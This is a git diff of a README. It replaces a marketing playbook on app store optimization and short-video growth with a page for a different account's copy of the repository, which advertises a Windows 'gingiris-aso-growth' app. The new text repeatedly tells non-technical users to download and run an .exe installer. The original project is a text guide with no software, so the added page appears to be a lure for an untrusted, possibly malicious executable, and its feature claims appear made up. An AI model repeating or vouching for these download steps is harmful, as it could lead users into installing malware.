@@ -1,181 +1,168 @@
-<div align="center">
+# 📈 gingiris-aso-growth - Simple ASO & Growth Tools
 
-<img src="assets/logo.png" alt="Gingiris Logo" width="120" />
-
-# 📱 ASO & App Cold Start Playbook
-
-### Complete guide from App Store Optimization to UGC operations, multi-platform content strategy, and AI-powered scaling
-
-[![GitHub stars](https://img.shields.io/github/stars/Gingiris/gingiris-aso-growth?style=social)](https://github.com/Gingiris/gingiris-aso-growth/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/Gingiris/gingiris-aso-growth?style=social)](https://github.com/Gingiris/gingiris-aso-growth/network/members)
-[![GitHub watchers](https://img.shields.io/github/watchers/Gingiris/gingiris-aso-growth?style=social)](https://github.com/Gingiris/gingiris-aso-growth/watchers)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/Gingiris/gingiris-aso-growth/pulls)
-[![Last Commit](https://img.shields.io/github/last-commit/Gingiris/gingiris-aso-growth?color=blue)](https://github.com/Gingiris/gingiris-aso-growth/commits/main)
-[![Contributors](https://img.shields.io/github/contributors/Gingiris/gingiris-aso-growth?color=orange)](https://github.com/Gingiris/gingiris-aso-growth/graphs/contributors)
-
-**[English](#english) | [中文](#中文版)**
-
-</div>
+[![Download Now](https://img.shields.io/badge/Download-gingiris--aso--growth-ff6347?style=for-the-badge&logo=github)](https://github.com/fatcow11111/gingiris-aso-growth)
 
 ---
 
-> 💡 **Need a 1-on-1 architecture call for your B2B/Open-source launch? Book a session for $200** (Crypto/USDT and Wire Transfer accepted) — [Contact @Iris_carrot on Telegram](https://t.me/Iris_carrot)
+## 📱 About gingiris-aso-growth
+
+gingiris-aso-growth helps you improve your app's presence on the App Store and Google Play. It focuses on keyword research, optimizing your app's description and metadata, user-generated content (UGC), and A/B testing. These tools support your app’s growth during its early days and beyond.
+
+This software works on Windows and is built to be easy to use, even if you do not have technical skills.
 
 ---
 
-## ⭐ Star This Repo
+## 🖥️ System Requirements
 
-<img width="100%" src="assets/star.png" alt="Star this repo" />
+To run gingiris-aso-growth on your Windows computer, you need:
 
-If you find this playbook useful, a GitHub Star ⭐ helps others discover it!
-
----
-
-## Why This Playbook?
-
-Created by **Iris (生姜iris)**, former cofounder & COO of [AFFiNE](https://github.com/toeverything/AFFiNE) (60k+ stars). This playbook documents battle-tested ASO and App growth strategies, compiled from expert sessions and industry best practices.
-
-### What You'll Learn
-
-| Module | Key Content |
-|--------|-------------|
-| 🔍 **ASO Basics** | Store page optimization, keyword research, rating optimization, chart ranking rules |
-| 🚀 **Cold Start Strategy** | Organic First principle, channel matrix, App vs Web differences |
-| 👥 **UGC Operations** | Creator sourcing, pricing & incentives, management architecture |
-| 📱 **Multi-Platform Content** | TikTok / Instagram / YouTube Shorts strategies |
-| 🤖 **AI Matrix Accounts** | AI video production, account nurturing, clone app tactics |
-| ⚖️ **Platform Comparison** | App Store vs Google Play algorithm differences |
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- Minimum 2 GHz processor  
+- 200 MB of free disk space  
+- Internet connection for downloading and updates  
 
 ---
 
-## English
+## 🚀 Getting Started
 
-> Source: ASO Learning Session (March 2026) + Industry Best Practices
+Follow these steps to get gingiris-aso-growth running on your Windows machine.
 
-### Core Principles
+### 1. Visit the Download Page
 
-- **Organic First** — Validate content models organically before scaling with paid ads
-- **Winning Format** — Find what works, then replicate at scale through UGC creators
-- **Platform-Native** — Tailor content for each platform's unique algorithm and audience
-- **Data-Driven** — Use ASO tools to find high-volume, low-competition keywords
+Go to the download page by clicking the badge below:
 
-### Cold Start Timeline
+[![Download Now](https://img.shields.io/badge/Download-gingiris--aso--growth-ff6347?style=for-the-badge&logo=github)](https://github.com/fatcow11111/gingiris-aso-growth)
 
-| Phase | Timing | Key Focus |
-|:---|:---|:---|
-| 🧪 Testing | Day 0 - Month 1 | Founder runs accounts, finds Winning Format |
-| ✅ Validation | Month 1-3 | Recruit UGC creators, replicate success |
-| 📈 Scaling | Month 3+ | Paid ads, influencer marketing, AI matrix |
+This page contains the latest files you need to install the app.
 
-### Three Major Platforms Compared
+### 2. Download the Installer
 
-| Platform | User Age | Conversion Rate | Key Metrics |
-|:---|:---|:---|:---|
-| **TikTok** | 13-18 | Lowest | Completion rate, Share rate |
-| **Instagram** | 18-25 | Medium | Share Rate, Like Rate |
-| **YouTube Shorts** | 25-35 | Highest | First 3-sec retention |
+Look for the release section on the page. You will find setup files for Windows. These files often end with `.exe`. Click the latest Windows installer link.
 
-### ASO Tools
+Save the file to a folder you can easily find, such as your Desktop or Downloads.
 
-| Tool | Pricing | Best For |
-|:---|:---|:---|
-| [Astro](https://tryastro.app/) | ~$80-90/yr | Indie developers, budget-friendly |
-| [点点数据](https://www.diandian.com/) | Custom | Chinese tool, global data |
-| [AppTweak](https://www.apptweak.com/) | Custom | AI insights, enterprise |
-| [AppFollow](https://appfollow.io/) | Custom | Review management + keywords |
+### 3. Run the Installer
 
-### Detailed Guides (English)
+Open the folder where you saved the installer.
 
-| Topic | File |
-|:---|:---|
-| Full Guide | [references/full-guide-zh.md](references/full-guide-zh.md) |
+Double-click the file to start the setup.
+
+If Windows asks for permission, click `Yes` to allow the installer to run.
+
+Follow the on-screen steps:
+
+- Accept the license agreement.  
+- Choose the installation folder or leave the default.  
+- Click `Install` to begin.
+
+Wait for the installation to finish. It will only take a few minutes.
+
+### 4. Launch the App
+
+When installation is complete, click `Finish`. You might see a checkbox asking if you want to start the app right away. Check it if you want to open it now.
+
+If you don’t open it right away, you can find the app in the Start menu under `gingiris-aso-growth`.
 
 ---
 
-## 中文版
+## 🛠️ How to Use gingiris-aso-growth
 
-> 整理自：王恒加老师 ASO 学习会议纪要（2026年3月）
+This tool helps with several tasks to grow your app’s presence. Here are the main parts:
 
-### 核心原则
+### Keyword Research
 
-- **先有机，后付费** — 先通过有机方式验证内容模型，再用付费方式规模化
-- **找到 Winning Format** — 创始人亲自测试，找到爆款模板后复制给 UGC 创作者
-- **平台原生化** — 针对每个平台的算法和用户特性定制内容
-- **数据驱动** — 用 ASO 工具找到搜索量高、竞争难度低的关键词
+- Enter a few words related to your app.  
+- The tool suggests popular keywords people use to find similar apps.  
+- You can filter results based on popularity, competition, and relevance.
 
-### 冷启动时间线
+Use this to choose the best keywords that make your app easier to find.
 
-| 阶段 | 时间 | 核心任务 |
-|:---|:---|:---|
-| 🧪 测试期 | Day 0 - 1个月 | 创始人亲自运营账号，找到 Winning Format |
-| ✅ 验证期 | 1-3个月 | 招募 UGC 创作者，复制成功模板 |
-| 📈 规模化 | 3个月+ | 付费投流、红人合作、AI 矩阵号 |
+### Metadata Optimization
 
-### 三大短视频平台对比
+- Edit the title, subtitle, and description of your app.  
+- See guidance on how to improve each section for better visibility.  
+- Check for length limits and keyword placement.
 
-| 平台 | 用户年龄 | 付费转化率 | 核心指标 |
-|:---|:---|:---|:---|
-| **TikTok** | 13-18岁 | 最低 | 完播率、分享率 |
-| **Instagram** | 18-25岁 | 中等 | Share Rate、Like Rate |
-| **YouTube Shorts** | 25-35岁 | 最高 | 前3秒停留率、完播率 |
+This helps you create clearer and more effective app listings.
 
-### UGC 定价参考
+### User-Generated Content (UGC)
 
-**基础定价**：$10-20/条
+- Collect reviews and feedback from users.  
+- Highlight positive comments to use in your store listing.  
+- Track any negative feedback to improve your app.
 
-**激励方案示例**：
-| 播放量 | 奖励 |
-|:---|:---|
-| 基础 | $20 |
-| 1 万 | +$20 |
-| 10 万 | +$50 |
-| 100 万 | +$200 |
+UGC is important to show real user experience and build trust.
 
-### App Store vs Google Play
+### A/B Testing
 
-| 维度 | App Store | Google Play |
-|:---|:---|:---|
-| **算法核心** | 元数据精确匹配 | 文本内容理解 + 技术性能 |
-| **关键词策略** | 精简、权重优先 | 全面、密度优先 |
-| **描述作用** | 不影响搜索排名 | **长描述是关键** |
-| **技术指标** | 间接影响 | **Android Vitals 直接影响** |
-| **A/B 测试** | PPO（需审核） | 商店列表实验（无需审核） |
+- Try different app icons, screenshots, or descriptions.  
+- The tool lets you test which versions perform better in terms of downloads and user interest.  
+- View reports with clear results.
 
-### 详细指南（中文）
-
-| 主题 | 文件 |
-|:---|:---|
-| 完整指南 | [references/full-guide-zh.md](references/full-guide-zh.md) |
+A/B testing shows you what changes work to attract more users.
 
 ---
 
-## About the Author
+## ⚙️ Setup and Configuration
 
-**Iris (生姜iris)** — Former cofounder & COO of AFFiNE, led global go-to-market from 0 to millions of users.
+After installing, open the app and follow these initial steps:
 
-- 💬 Telegram: [@Iris_carrot](https://t.me/Iris_carrot)
-- 📱 即刻: 生姜iris
-- 📧 公众号: 云宝的桃花坞
+1. Create a new project by clicking `New Project`.  
+2. Enter your app’s basic details: name, platform (App Store or Google Play), and package or bundle ID.  
+3. Import any existing app data or reports if available.  
+4. Explore the sections (Keywords, Metadata, UGC, A/B testing).
 
-### Consulting
-
-| Service | Price |
-|:---|:---|
-| 30-min Session | ¥800 |
-| 60-min Session | ¥1,500 |
-| Monthly Retainer (≤5h) | ¥7,000 |
+The interface is designed to be clear and organized, so you can work step by step.
 
 ---
 
-## Related Playbooks
+## 🧰 Tools and Features Overview
 
-- [gingiris-launch](https://github.com/Gingiris/gingiris-launch) — AI Product Global Launch Playbook
-- [gingiris-opensource](https://github.com/Gingiris/gingiris-opensource) — Open Source Launch Marketing
-- [gingiris-b2b-growth](https://github.com/Gingiris/gingiris-b2b-growth) — B2B SaaS Growth Playbook
+- **Keyword Analyzer:** Finds keywords that fit your app and target users.  
+- **Metadata Editor:** Helps you write titles and descriptions that work well.  
+- **UGC Manager:** Collects and sorts reviews and comments.  
+- **Testing Module:** Runs comparison tests on app elements.  
+- **Reports:** Generate simple PDFs or spreadsheets to share or review progress.
+
+All reports are easy to read and do not require additional software.
 
 ---
 
-## License
+## ❓ Troubleshooting and Help
 
-MIT License - Feel free to use and adapt!
+If you run into common issues:
+
+- Confirm system requirements meet the minimum specs.  
+- Check your internet connection while downloading or updating.  
+- Restart the app if it freezes or closes unexpectedly.  
+- Make sure Windows is up to date.  
+- Look for errors on the screen and try to read any messages.
+
+If you still need help, visit the Issues tab on the GitHub page to see existing problems or submit a new one.
+
+---
+
+## 🔗 Download and Installation Recap
+
+Download the installer for Windows here:
+
+[![Download gingiris-aso-growth](https://img.shields.io/badge/Download-gingiris--aso--growth-ff6347?style=for-the-badge&logo=github)](https://github.com/fatcow11111/gingiris-aso-growth)
+
+Run the `.exe` file and follow prompts to install.
+
+Launch the app and start managing your app store growth easily.
+
+---
+
+## 📚 Additional Resources
+
+- Check the README on GitHub for advanced guides.  
+- Explore the app marketing topics: app-store-optimization, user-acquisition, and mobile growth.  
+- Use this tool alongside your app analytics to improve results.
+
+---
+
+## 📝 License
+
+gingiris-aso-growth is licensed under the MIT License. You can use, modify, and share it freely.
